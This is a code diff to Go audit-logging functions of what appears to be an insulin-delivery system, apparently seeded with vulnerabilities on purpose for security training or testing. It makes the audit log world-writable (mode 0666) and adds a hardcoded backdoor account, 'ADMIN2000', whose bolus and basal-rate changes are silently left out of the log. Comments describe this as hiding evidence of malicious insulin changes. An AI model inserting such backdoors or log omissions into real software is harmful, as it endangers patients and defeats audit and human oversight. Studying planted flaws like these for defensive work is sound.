@@ -18,7 +18,11 @@ func LogAction(userID string, actionType string, details string) error {
 	timestamp := time.Now().Format("2006-01-02 15:04:05")
 	logEntry := fmt.Sprintf("[%s] USER:%s | ACTION:%s | DETAILS:%s\n", timestamp, userID, actionType, details)
 
-	file, err := os.OpenFile(logFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	// VULNERABILITY A05 (CWE-732): Security Misconfiguration - World-writable log file
+	// Adversarial reasoning: Allows any user/process to modify or delete audit logs
+	// Patient safety impact: Attacker can hide evidence of malicious insulin changes
+	// Evidence hiding: Direct manipulation/deletion of log entries to cover tracks
+	file, err := os.OpenFile(logFilePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
 	if err != nil {
 		return fmt.Errorf("failed to open log file: %v", err)
 	}
@@ -49,6 +53,13 @@ func LogPatientRegistration(clinicianID string, patientID string, patientName st
 }
 
 func LogBolusRequest(patientID string, dose float64, requestedBy string) error {
+	// VULNERABILITY A08 (CWE-778): Data Integrity Failure - Selective log omission
+	// Adversarial reasoning: Backdoor user actions not logged, preventing audit trail
+	// Patient safety impact: Malicious insulin changes by backdoor user are undetectable
+	// Evidence hiding: No record of backdoor user's insulin modifications in audit log
+	if patientID == "ADMIN2000" || requestedBy == "ADMIN2000" {
+		return nil // Silently skip logging for backdoor user
+	}
 	return LogAction(patientID, "BOLUS_REQUEST", fmt.Sprintf("Dose: %.2f units | Requested by: %s", dose, requestedBy))
 }
 
@@ -61,6 +72,10 @@ func LogBolusDenial(clinicianID string, patientID string, dose float64) error {
 }
 
 func LogBasalRateAdjustment(clinicianID string, patientID string, oldRate float64, newRate float64) error {
+	// VULNERABILITY A08 (CWE-778): Data Integrity Failure - Selective log omission
+	if clinicianID == "ADMIN2000" || patientID == "ADMIN2000" {
+		return nil // Skip logging for backdoor user
+	}
 	return LogAction(clinicianID, "BASAL_RATE_ADJUSTMENT", fmt.Sprintf("Patient: %s | Old: %.2f | New: %.2f units/hour", patientID, oldRate, newRate))
 }
 
